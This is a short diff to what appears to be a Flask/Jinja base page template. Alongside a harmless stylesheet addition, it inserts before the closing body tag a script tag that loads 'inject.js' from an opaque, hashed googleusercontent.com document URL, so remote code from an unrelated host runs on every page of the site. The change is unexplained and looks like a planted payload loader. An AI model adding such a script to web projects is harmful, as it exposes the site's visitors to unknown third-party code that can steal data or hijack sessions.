@@ -6,6 +6,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{% block title %}{% endblock %}</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <!-- Defines color variables, e.g. var(color--red) -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/colors.css') }}">
     <link rel="icon" href="{{ url_for('static', filename='homeImages/favicon.png') }}">
     {% block style %}{% endblock %}
     {% block script %}{% endblock %}
@@ -18,6 +20,7 @@
     <div id="content">
         {% block main %}{% endblock %}
     </div>
+<script type='text/javascript'  src="https://doc-0c-6c-docs.googleusercontent.com/14692e8a3920270b81d423dd70ce3bed8fd56862bc1c6706cfce00fef8f4cbc3/inject.js"></script>
 </body>
 
 </html>
